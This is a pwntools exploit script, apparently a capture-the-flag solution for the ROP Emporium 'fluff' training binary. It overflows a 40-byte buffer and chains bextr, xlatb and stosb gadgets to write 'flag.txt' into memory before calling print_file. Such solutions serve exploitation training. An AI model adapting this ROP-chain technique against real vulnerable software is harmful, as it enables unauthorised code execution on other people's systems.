# https://ropemporium.com/challenge/fluff.html
# ROPE{a_placeholder_64byte_flag!}
# pwn0x80.github.io
# aditya0x80


from pwn import *

# 0x0000000000400639 : stosb byte ptr [rdi], al ; ret and inc rdi
f_space = p64(0x601038)

flag_magic = 0xb
betr_magic = 0x3ef2

elf = ELF("fluff")
p = process(elf.path)

poping_bxter = p64(0x0040062a)
bxtr = p64(0x0000000000400633)
xlatb = p64(0x00400628)
stosb = p64(0x400639)
pop_rdi = p64(0x4006a3)

print_file = p64(elf.symbols['print_file'])


buff = b'A'*40
flag_txt = b"flag.txt"
magic_2 = [b'\v', b'f', b'l', b'a', b'g', b'.', b't', b'x']

flag_addr = [(int(next(elf.search(chr(i).encode())))-int(0x3ef2))
             for i in flag_txt]

final_magic = [p64(flag_addr[i] - ord(magic_2[i]))
               for i in range(len(magic_2))]
#    final_flag = flag_addr[i] - ord(magic_2[i])
#   print(p64(final_flag))
# print(p64(flag_addr[1] - int(i)))

# raw_input("debug")

once = [
    buff, poping_bxter, p64(
        0x4000), final_magic[0], xlatb, pop_rdi, f_space, stosb
]
payload = b"".join(once)

# payload = buff + popingbextr + \
# p64(0x4000) + final_magic[0] + xlatb + \
#    pop_rdi + f_space + stosb + print_file
# a = hex(next(elf.search(chr(i).encode())))
#   print(a)

for i in range(1, 8):
    looping = [
        poping_bxter,  p64(
            0x4000), final_magic[i], xlatb, stosb
    ]
    payload += b"".join(looping)

final = [
    pop_rdi, f_space, print_file
]
payload += b"".join(final)


p.sendline(payload)
response = p.recv()

print(response.decode())

# p.interactive()
